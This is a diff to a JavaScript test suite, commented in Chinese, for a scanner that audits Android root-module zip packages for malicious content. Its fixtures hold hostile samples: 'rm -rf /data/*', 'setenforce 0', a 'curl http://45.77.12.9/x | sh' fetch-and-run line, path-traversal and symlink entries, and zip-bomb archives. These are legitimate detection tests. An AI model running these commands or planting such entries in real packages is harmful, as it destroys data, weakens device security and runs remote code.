@@ -13,8 +13,10 @@ import { deflateRawSync, crc32 } from 'node:zlib';
 import {
   RULES_BY_ID, CONTENT_RULES, scanContent, checkMetadata, parseModuleProp,
   scoreRisk, decide, countsTowardRisk, SEVERITY_ORDER,
+  inspectStructure, unsafePathReason, detectBinary, checkCoverage, checkUnread, checkBinaries,
+  MAX_TEXT, MAX_ENTRIES, MAX_RATIO,
 } from './risk-rules.mjs';
-import { scanZip, classify, renderMarkdown, renderJSON, mask, resolveChangeType, CANONICAL_SCRIPTS } from './scan.mjs';
+import { scanZip, classify, renderMarkdown, renderJSON, mask, resolveChangeType, CANONICAL_SCRIPTS, FLASH_ENTRY_POINTS, readZip } from './scan.mjs';
 
 // ---------------------------------------------------------------------------
 // 辅助：命中判定
@@ -278,24 +280,30 @@ function crc32buf(buf) {
 }
 
 function buildZip(entries) {
-  // entries: [{ name, content(string) }] -> Buffer（deflate 压缩）
+  // entries: [{ name, content(string|Buffer), method = 8, extAttr = 0,
+  //             declaredOrig, declaredComp }] -> Buffer
+  // declaredOrig/declaredComp 允许只改中心目录的声明值：测 zip bomb 与伪装条目时，
+  // 需要的正是「声明与真实不一致」这种输入。
   const locals = [];
   const central = [];
   let offset = 0;
   for (const e of entries) {
     const nameBuf = Buffer.from(e.name, 'utf8');
-    const dataBuf = Buffer.from(e.content, 'utf8');
-    const comp = deflateRawSync(dataBuf);
+    const dataBuf = Buffer.isBuffer(e.content) ? e.content : Buffer.from(String(e.content == null ? '' : e.content), 'utf8');
+    const method = e.method == null ? 8 : e.method;
+    const comp = method === 8 ? deflateRawSync(dataBuf) : dataBuf;
     const crc = crc32buf(dataBuf);
+    const origDecl = e.declaredOrig == null ? dataBuf.length : e.declaredOrig;
+    const compDecl = e.declaredComp == null ? comp.length : e.declaredComp;
 
     const lh = Buffer.alloc(30);
     lh.writeUInt32LE(0x04034b50, 0);
     lh.writeUInt16LE(20, 4);
     lh.writeUInt16LE(0, 6);
-    lh.writeUInt16LE(8, 8); // deflate
+    lh.writeUInt16LE(method, 8);
     lh.writeUInt32LE(crc, 14);
-    lh.writeUInt32LE(comp.length, 18);
-    lh.writeUInt32LE(dataBuf.length, 22);
+    lh.writeUInt32LE(compDecl, 18);
+    lh.writeUInt32LE(origDecl, 22);
     lh.writeUInt16LE(nameBuf.length, 26);
     lh.writeUInt16LE(0, 28);
     locals.push(lh, nameBuf, comp);
@@ -305,11 +313,12 @@ function buildZip(entries) {
     ch.writeUInt16LE(20, 4);
     ch.writeUInt16LE(20, 6);
     ch.writeUInt16LE(0, 8);
-    ch.writeUInt16LE(8, 10);
+    ch.writeUInt16LE(method, 10);
     ch.writeUInt32LE(crc, 16);
-    ch.writeUInt32LE(comp.length, 20);
-    ch.writeUInt32LE(dataBuf.length, 24);
+    ch.writeUInt32LE(compDecl, 20);
+    ch.writeUInt32LE(origDecl, 24);
     ch.writeUInt16LE(nameBuf.length, 28);
+    ch.writeUInt32LE(e.extAttr || 0, 38);
     ch.writeUInt32LE(offset, 42);
     central.push(ch, nameBuf);
 
@@ -389,7 +398,10 @@ test('端到端：恶意模块判 high，脚本全文与行号证据都在报告
   assert.equal(sel.line, 2);
   assert.match(sel.snippet, /setenforce/);
   assert.ok(r.scripts.every((s) => typeof s.content === 'string' && s.content.length > 0));
-  assert.equal(r.scripts.length, 4, 'customize/service/uninstall/action 四个 .sh 全部纳入');
+  // 全文内嵌的是「会被执行或会被读的文本」：四个 .sh 入口 + module.prop
+  // （.prop 属属性文件，installer/resetprop 会读，同样纳入行级规则）
+  assert.equal(r.scripts.length, 5, 'customize/service/uninstall/action 四个 .sh 与 module.prop 全部纳入');
+  assert.ok(r.scripts.some((s) => s.name === 'module.prop'));
 });
 
 test('端到端：低风险但为版本更新 -> 打 needs-human-review 不自动合入', () => {
@@ -455,3 +467,287 @@ test('缺少 module.prop 的 zip 报 META_PROP_MISSING 且不低于 medium', () 
   assert.notEqual(r.riskLevel, 'low', '缺少 module.prop 不应判 low');
   assert.equal(r.decision.needsHumanReview, true);
 });
+
+// ---------------------------------------------------------------------------
+// ⑥ 包结构与审核覆盖度
+// ---------------------------------------------------------------------------
+
+test('unsafePathReason：绝对路径 / 上跳 / 盘符 / 反斜杠里的 .. 都能认出', () => {
+  assert.equal(unsafePathReason('system/etc/hosts'), null);
+  assert.equal(unsafePathReason('../escape.sh'), '含 .. 的上跳路径');
+  assert.equal(unsafePathReason('a/../../escape.sh'), '含 .. 的上跳路径');
+  assert.equal(unsafePathReason('a\\..\\escape.sh'), '含 .. 的上跳路径', '反斜杠必须先归一化，否则 split("/") 看不见上跳');
+  assert.equal(unsafePathReason('/system/etc/hosts'), '绝对路径');
+  assert.equal(unsafePathReason('C:/Windows/x'), 'Windows 盘符绝对路径');
+  assert.equal(unsafePathReason(''), '空条目名');
+  assert.equal(unsafePathReason('a..b/config'), null, '文件名里含 .. 但不是路径段，不算上跳');
+});
+
+test('detectBinary：ELF/PE/Mach-O/DEX/class 与「开头含 NUL」命中，纯文本不命中', () => {
+  assert.equal(detectBinary(Buffer.from('\x7fELF\x02\x01\x01', 'latin1')).id, 'ELF');
+  assert.equal(detectBinary(Buffer.from('MZ\x90\x00', 'latin1')).id, 'PE');
+  assert.equal(detectBinary(Buffer.from([0xfe, 0xed, 0xfa, 0xce, 0])).id, 'MACHO');
+  assert.equal(detectBinary(Buffer.from([0xca, 0xfe, 0xba, 0xbe])).id, 'MACHO');
+  assert.equal(detectBinary(Buffer.from([0xca, 0xfe, 0xba, 0xbe])).id, 'MACHO', 'fat 头，同时也是 Java class 的头四字节');
+  assert.equal(detectBinary(Buffer.from([0xbf, 0xba, 0xfe, 0xca])).id, 'MACHO', 'fat 64 的小端');
+  assert.equal(detectBinary(Buffer.from([0x7f, 0x45, 0x4c, 0x21])), null, 'ELF 头不完整不能误判；无 NUL 也不该算二进制');
+  assert.equal(detectBinary(Buffer.from('dex\n035\0', 'latin1')).id, 'DEX');
+  assert.equal(detectBinary(Buffer.from('name=foo\x00bar', 'utf8')).id, 'NUL', '改名成 .txt 的伪装');
+  assert.equal(detectBinary(Buffer.from(CLEAN_SH, 'utf8')), null);
+  assert.equal(detectBinary(Buffer.from('id=cool_mod', 'utf8')), null);
+  assert.equal(detectBinary(null), null);
+});
+
+test('inspectStructure：重名/符号链接/越界/条目数/压缩比/超大各有对应级别，且都参与定级', () => {
+  const { findings, stats } = inspectStructure([
+    { name: 'module.prop', method: 8, compSize: 10, origSize: 40 },
+    { name: '../escape.sh', method: 8, compSize: 10, origSize: 20 },
+    { name: '/system/xbin/bb', method: 8, compSize: 10, origSize: 20 },
+    { name: 'service.sh', method: 8, compSize: 10, origSize: 20 },
+    { name: 'service.sh', method: 8, compSize: 10, origSize: 20 },
+    { name: 'w.conf', method: 8, compSize: 10, origSize: 20, isSymlink: true },
+    { name: 'secret.bin', method: 8, compSize: 10, origSize: 20, encrypted: true },
+    { name: 'packed.bz2', method: 12, compSize: 10, origSize: 20 },
+    { name: 'winpath\\a.sh', method: 8, compSize: 10, origSize: 20 },
+    { name: 'bomb', method: 8, compSize: 1, origSize: 40000 },
+  ]);
+  const ids = new Set(findings.map((f) => f.ruleId));
+  for (const need of ['STRUCT_UNSAFE_PATH', 'STRUCT_DUPLICATE_NAME', 'STRUCT_SYMLINK',
+    'STRUCT_ENCRYPTED', 'STRUCT_UNSUPPORTED_METHOD', 'STRUCT_BACKSLASH_PATH', 'STRUCT_RATIO']) {
+    assert.ok(ids.has(need), `应命中 ${need}；实际 ${[...ids].join(',')}`);
+  }
+  assert.equal(findings.find((f) => f.ruleId === 'STRUCT_UNSAFE_PATH').severity, 'high');
+  assert.equal(findings.find((f) => f.ruleId === 'STRUCT_DUPLICATE_NAME').severity, 'high');
+  assert.equal(findings.find((f) => f.ruleId === 'STRUCT_SYMLINK').severity, 'high');
+  assert.ok(findings.every((f) => f.category === 'structure'));
+  assert.ok(findings.every((f) => countsTowardRisk(f)), '结构发现必须参与定级，不能只是提示');
+  assert.deepEqual(stats.duplicateNames, ['service.sh']);
+  assert.equal(stats.symlinks.length, 1);
+  assert.equal(stats.entries, 10);
+  assert.equal(stats.fileEntries, 10);
+});
+
+test('inspectStructure：条目数与解压总量超阈值才报，正常包一条都不报', () => {
+  const many = Array.from({ length: MAX_ENTRIES + 5 }, (_, i) => ({ name: `f/${i}.sh`, method: 8, compSize: 100, origSize: 120 }));
+  const ids = inspectStructure(many).findings.map((f) => f.ruleId);
+  assert.ok(ids.includes('STRUCT_ENTRY_COUNT'), JSON.stringify(ids));
+
+  const bomb = [{ name: 'z', method: 8, compSize: 1000, origSize: 600 * 1024 * 1024 }];
+  const b = inspectStructure(bomb).findings.map((f) => f.ruleId);
+  assert.ok(b.includes('STRUCT_ZIP_BOMB'), JSON.stringify(b));
+
+  const normal = inspectStructure([
+    { name: 'module.prop', method: 8, compSize: 90, origSize: 180 },
+    { name: 'customize.sh', method: 8, compSize: 60, origSize: 240 },
+    { name: 'system/', method: 0, compSize: 0, origSize: 0, isDir: true },
+  ]);
+  assert.equal(normal.findings.length, 0, JSON.stringify(normal.findings));
+  assert.equal(normal.stats.dirEntries, 1, '目录条目不参与重名/越界判断');
+});
+
+test('checkCoverage / checkUnread / checkBinaries 的发现一律不低于 medium，以挡住自动放行', () => {
+  const cov = checkCoverage([{ name: 'big.sh', size: MAX_TEXT + 10, truncated: true }, { name: 'ok.sh', size: 10, truncated: false }]);
+  assert.equal(cov.length, 1);
+  assert.equal(cov[0].ruleId, 'AUDIT_COVERAGE_TRUNCATED');
+  assert.ok(SEVERITY_ORDER[cov[0].severity] >= SEVERITY_ORDER.medium);
+
+  const un = checkUnread([{ name: 'a', reason: 'x', overLimit: true }, { name: 'b', reason: 'y', overLimit: false }]);
+  assert.equal(un.length, 2);
+  assert.ok(un.every((f) => f.ruleId === 'STRUCT_UNREADABLE' && SEVERITY_ORDER[f.severity] >= SEVERITY_ORDER.medium));
+  assert.match(un[0].advice, /zip bomb/);
+
+  const bin = checkBinaries([{ name: 'update-binary', id: 'ELF', why: 'ELF 可执行文件/共享库', bytes: 4096 }]);
+  assert.equal(bin[0].ruleId, 'STRUCT_BINARY');
+  assert.ok(SEVERITY_ORDER[bin[0].severity] >= SEVERITY_ORDER.medium);
+  assert.deepEqual(checkUnread([]), []);
+});
+
+// ---------------------------------------------------------------------------
+// 端到端：结构类攻击必须拦得住
+// ---------------------------------------------------------------------------
+
+test('端到端：越界路径条目判 high 且绝不自动放行', () => {
+  const p = writeZip('traversal.zip', [
+    { name: 'module.prop', content: CLEAN_PROP },
+    { name: 'customize.sh', content: CLEAN_SH },
+    { name: '../escape.sh', content: '#!/system/bin/sh\n' },
+  ]);
+  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
+  assert.equal(r.riskLevel, 'high');
+  assert.equal(r.decision.needsHumanReview, true);
+  assert.ok(r.findings.some((f) => f.ruleId === 'STRUCT_UNSAFE_PATH' && f.file === '../escape.sh'));
+});
+
+test('端到端：符号链接条目判 high（脚本本身一行危险模式都没有也照样拦）', () => {
+  const p = writeZip('symlink.zip', [
+    { name: 'module.prop', content: CLEAN_PROP },
+    { name: 'customize.sh', content: CLEAN_SH },
+    { name: 'link/hosts', content: '/data/data/com.xxx/databases/x.db', extAttr: 0xa1ff0000 },
+  ]);
+  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
+  assert.equal(r.riskLevel, 'high');
+  assert.ok(r.findings.some((f) => f.ruleId === 'STRUCT_SYMLINK'));
+  assert.deepEqual(r.structure.symlinks, ['link/hosts']);
+});
+
+test('端到端：重名条目判 high —— 扫描器看到的那份未必是被解压的那份', () => {
+  const p = writeZip('dup.zip', [
+    { name: 'module.prop', content: CLEAN_PROP },
+    { name: 'service.sh', content: '#!/system/bin/sh\nexit 0\n' },
+    { name: 'service.sh', content: '#!/system/bin/sh\nrm -rf /data/*\n' },
+  ]);
+  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
+  assert.ok(r.findings.some((f) => f.ruleId === 'STRUCT_DUPLICATE_NAME'), JSON.stringify(r.findings.map((f) => f.ruleId)));
+  assert.equal(r.riskLevel, 'high');
+  assert.deepEqual(r.structure.duplicateNames, ['service.sh']);
+});
+
+test('端到端：META-INF 安装期入口里的恶意代码会被扫到（此前这类文件一行都没读）', () => {
+  assert.ok(FLASH_ENTRY_POINTS.includes('META-INF/com/google/android/updater-script'));
+  const p = writeZip('handler.zip', [
+    { name: 'module.prop', content: CLEAN_PROP },
+    { name: 'customize.sh', content: CLEAN_SH },
+    { name: 'META-INF/com/google/android/updater-script', content: '#!/system/bin/sh\nsetenforce 0\nrm -rf /data/*\n' },
+  ]);
+  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
+  assert.equal(r.riskLevel, 'high');
+  const ids = new Set(r.findings.map((f) => f.ruleId));
+  assert.ok(ids.has('SELINUX_DISABLE') && ids.has('RM_RF_MUTABLE'), JSON.stringify([...ids]));
+  const hit = r.findings.find((f) => f.ruleId === 'SELINUX_DISABLE');
+  assert.equal(hit.file, 'META-INF/com/google/android/updater-script');
+  assert.equal(r.inventory.handlers.length, 1, '入口文件要在清单里单独成类，便于人工定位');
+});
+
+test('端到端：.lua / .js / .prop 里的危险模式同样纳入行级规则', () => {
+  const p = writeZip('langs.zip', [
+    { name: 'module.prop', content: CLEAN_PROP },
+    { name: 'service.lua', content: 'os.execute("setenforce 0")\n' },
+    { name: 'hook.js', content: 'var s = "curl http://45.77.12.9/x | sh";\n' },
+    { name: 'system.prop', content: 'ro.x.url=http://payload.xyz/c\n' },
+  ]);
+  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
+  const files = new Set(r.findings.map((f) => f.file));
+  for (const need of ['service.lua', 'hook.js', 'system.prop']) {
+    assert.ok(files.has(need), `${need} 应产生发现；实际 ${[...files].join(',')}`);
+  }
+  assert.ok(SEVERITY_ORDER[r.riskLevel] >= SEVERITY_ORDER.medium);
+});
+
+test('端到端：把 ELF 改名成 config.js 也只能落到「二进制」，不会当成脚本放过', () => {
+  const elf = Buffer.concat([Buffer.from('\x7fELF\x02\x01\x01\x00', 'latin1'), Buffer.alloc(200, 0)]);
+  const p = writeZip('disguise.zip', [
+    { name: 'module.prop', content: CLEAN_PROP },
+    { name: 'customize.sh', content: CLEAN_SH },
+    { name: 'config.js', content: elf },
+  ]);
+  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
+  assert.notEqual(r.riskLevel, 'low', '二进制负载不应判 low');
+  assert.equal(r.decision.needsHumanReview, true);
+  assert.ok(r.findings.some((f) => f.ruleId === 'STRUCT_BINARY' && f.file === 'config.js'),
+    JSON.stringify(r.findings.map((f) => f.ruleId)));
+  assert.deepEqual(r.binaries.map((b) => b.name), ['config.js']);
+  assert.ok(!r.scripts.some((s) => s.name === 'config.js'), '机器码不进「全文」一节，否则 PR 评论会被灌满');
+});
+
+test('端到端：payload 藏在 512 KB 之后照样被行级规则命中，同时报覆盖度缺口', () => {
+  const filler = '# 填充行，用于把危险语句推到报告内嵌上限之外\n'.repeat(1 + Math.ceil(MAX_TEXT / 60));
+  const body = filler + '\nsetenforce 0\n';
+  const p = writeZip('late-payload.zip', [
+    { name: 'module.prop', content: CLEAN_PROP },
+    { name: 'customize.sh', content: body },
+  ]);
+  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
+  const big = r.inventory.canonicalScripts.find((s) => s.name === 'customize.sh');
+  assert.ok(big.bytes > MAX_TEXT, `样本必须超过内嵌上限，实际 ${big.bytes}`);
+  assert.equal(big.truncated, true);
+  const sel = r.findings.find((f) => f.ruleId === 'SELINUX_DISABLE');
+  assert.ok(sel, '规则必须跑全文：藏在尾部的 setenforce 不能因为报告截断而漏掉');
+  assert.ok(sel.line > 1000, `命中的是尾部行，实际第 ${sel && sel.line} 行`);
+  assert.equal(r.riskLevel, 'high');
+  assert.ok(r.findings.some((f) => f.ruleId === 'AUDIT_COVERAGE_TRUNCATED'), '看不全本身也要报，挡住自动放行');
+  assert.match(renderMarkdown(r), /包结构与审核覆盖度/);
+  assert.match(renderMarkdown(r), /报告只内嵌前/);
+});
+
+test('端到端：声明解压 1 GB 的条目按 zip bomb 拦下', () => {
+  const p = writeZip('bomb.zip', [
+    { name: 'module.prop', content: CLEAN_PROP },
+    { name: 'z', content: 'x', method: 0, declaredOrig: 1024 * 1024 * 1024 },
+  ]);
+  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
+  const ids = new Set(r.findings.map((f) => f.ruleId));
+  assert.ok(ids.has('STRUCT_ZIP_BOMB'), JSON.stringify([...ids]));
+  assert.ok(ids.has('STRUCT_RATIO'), JSON.stringify([...ids]));
+  assert.equal(r.riskLevel, 'high');
+  assert.equal(r.decision.needsHumanReview, true);
+  assert.ok(r.structure.totalUncompressed >= 1024 * 1024 * 1024, String(r.structure.totalUncompressed));
+});
+
+test('端到端：主动挡下的超大条目不能再交给系统 unzip 试一遍', () => {
+  // 唯一的条目超限 -> files 为空。若不加 deliberate 判断，这里会去调外部 unzip，
+  // 等于把刚拦住的超大条目重新解压一次（runner 当场被打满的就是这一步）。
+  const p = writeZip('over-limit.zip', [
+    { name: 'blob', content: Buffer.alloc(2 * 1024 * 1024, 0x41) },
+  ]);
+  const r = scanZip(p, { changeType: 'first', maxEntryBytes: 64 * 1024 });
+  assert.equal(r.reader, 'builtin', '不许回退');
+  assert.equal(r.unread.length, 1);
+  assert.equal(r.unread[0].overLimit, true);
+  assert.ok(r.findings.some((f) => f.ruleId === 'STRUCT_UNREADABLE'));
+  assert.notEqual(r.riskLevel, 'low');
+});
+
+test('端到端：声明说谎（说 10 B 实际 2 MB）时，解压硬上限是唯一还管用的闸', () => {
+  const big = Buffer.alloc(2 * 1024 * 1024, 0x41);
+  const p = writeZip('lying.zip', [
+    { name: 'module.prop', content: CLEAN_PROP },
+    { name: 'blob', content: big, declaredOrig: 10 },
+  ]);
+  // 先证明：不做隔离时这个条目本来能正常读出来，问题只在超上限
+  const wide = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
+  assert.ok(wide.files === undefined || wide.unread.length === 0, JSON.stringify(wide.unread));
+
+  const tight = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first', maxEntryBytes: 64 * 1024 });
+  assert.equal(tight.reader, 'builtin');
+  assert.equal(tight.unread.length, 1, JSON.stringify(tight.unread));
+  assert.equal(tight.unread[0].name, 'blob');
+  assert.equal(tight.unread[0].overLimit, true, '必须归因为「超上限」，而不是笼统的解压失败');
+  assert.match(tight.unread[0].reason, /上限/);
+  assert.ok(tight.findings.some((f) => f.ruleId === 'STRUCT_UNREADABLE'));
+  assert.notEqual(tight.riskLevel, 'low', '读不到不等于干净');
+  assert.equal(tight.structure.limits.MAX_ENTRY_UNCOMPRESSED, 64 * 1024, '报告里写的上限必须就是这次生效的上限');
+});
+
+test('端到端：系统 unzip 回退通道看不到结构属性，因此不予自动放行', () => {
+  // 直接验回退路径的定级语义：reader=unzip 时必须自带 AUDIT_COVERAGE_METADATA。
+  // 构造一个内置解析器读不出的文件（EOCD 被截断）来触发回退，
+  // 若本机没有 unzip 就跳过 —— 这条断言依赖外部命令，不该因此把测试变成不稳定测试。
+  const dir = mkdtempSync(join(tmpdir(), 'modaudit-'));
+  const p = join(dir, 'broken.zip');
+  const good = buildZip([{ name: 'module.prop', content: CLEAN_PROP }]);
+  writeFileSync(p, good.subarray(0, good.length - 10)); // 破坏 EOCD
+  let r;
+  try {
+    r = scanZip(p, { changeType: 'first' });
+  } catch (err) {
+    assert.match(String(err.message), /unzip/, '回退失败只可能是本机没有 unzip');
+    return;
+  }
+  assert.equal(r.reader, 'unzip');
+  assert.ok(r.findings.some((f) => f.ruleId === 'AUDIT_COVERAGE_METADATA'), JSON.stringify(r.findings.map((f) => f.ruleId)));
+  assert.equal(r.decision.needsHumanReview, true);
+});
+
+test('readZip 带出 entries 元数据与 head，供结构/二进制判断使用', () => {
+  const p = writeZip('meta.zip', [
+    { name: 'module.prop', content: CLEAN_PROP },
+    { name: 'link', content: '/system/bin/sh', extAttr: 0xa1ff0000 },
+  ]);
+  const { files, entries, unread } = readZip(p);
+  assert.equal(unread.length, 0);
+  assert.equal(entries.length, 2);
+  assert.equal(entries.find((e) => e.name === 'link').isSymlink, true);
+  assert.equal(entries.find((e) => e.name === 'module.prop').isSymlink, false);
+  assert.deepEqual([...files.find((f) => f.name === 'module.prop').head.subarray(0, 3)], [0x69, 0x64, 0x3d], 'head 是解压后的字节，不是压缩流');
+});
+
